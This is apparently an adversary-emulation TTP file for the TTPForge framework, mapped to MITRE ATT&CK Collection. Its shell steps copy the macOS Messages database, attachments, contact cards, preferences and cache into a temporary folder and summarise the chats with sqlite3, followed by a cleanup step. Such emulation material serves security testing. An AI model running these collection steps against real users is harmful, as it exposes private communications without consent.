---
api_version: 2.0
uuid: 9dabadbe-ceb8-4c3b-9a51-d96e0c26bb6f
name: Extract Messages Database
authors:
- TTPForge
description: |
  Extract and collect data from the macOS Messages application
mitre:
  tactics:
  - TA0009 Collection
  techniques:
  - T1005 Data from Local System
requirements:
  platforms:
  - os: darwin
args:
- name: output_path
  description: Output path for Messages data
  type: string
  default: /tmp/messages_data
- name: extract_attachments
  description: Extract message attachments
  type: boolean
  default: true
steps:
- name: Create output directory
  inline: mkdir -p {{ .Args.output_path }}
- name: Extract Messages database
  inline: |
    messages_db="$HOME/Library/Messages/chat.db"
    if [ -f "$messages_db" ]; then
      cp "$messages_db" "{{ .Args.output_path }}/chat.db" 2>/dev/null || true
    fi
- name: Extract Contacts and vCard data
  inline: |
    find ~/Library/Messages -name "*.vcf" -o -name "*.vcard" 2>/dev/null | xargs -I {} cp {} {{ .Args.output_path }}/ 2>/dev/null || true
- name: Collect message attachments
  inline: |
    attachments_path="$HOME/Library/Messages/Transfers"
    if [ -d "$attachments_path" ]; then
      mkdir -p {{ .Args.output_path }}/attachments
      cp -r "$attachments_path" "{{ .Args.output_path }}/attachments/" 2>/dev/null || true
    fi
- name: Query Messages database
  inline: |
    if [ -f "{{ .Args.output_path }}/chat.db" ]; then
      sqlite3 "{{ .Args.output_path }}/chat.db" \
        "SELECT COUNT(*) as message_count FROM message;" 2>/dev/null > {{ .Args.output_path }}/message_count.txt || true
      sqlite3 "{{ .Args.output_path }}/chat.db" \
        "SELECT chat_id, COUNT(*) as count FROM message GROUP BY chat_id ORDER BY count DESC LIMIT 10;" 2>/dev/null > {{ .Args.output_path }}/chat_summary.txt || true
    fi
- name: Collect iMessage preferences
  inline: |
    find ~/Library/Preferences -name "*messages*" -o -name "*imessage*" 2>/dev/null | xargs -I {} cp {} {{ .Args.output_path }}/ 2>/dev/null || true
- name: Extract message cache
  inline: |
    cache_path="$HOME/Library/Caches/com.apple.Messages"
    if [ -d "$cache_path" ]; then
      cp -r "$cache_path" "{{ .Args.output_path }}/message_cache" 2>/dev/null || true
    fi
  cleanup:
    inline: |-
      rm -rf {{ .Args.output_path }}
      test ! -d {{ .Args.output_path }} && echo "Messages data cleanup completed"
tests:
- name: dry_run_test
  dry_run: true
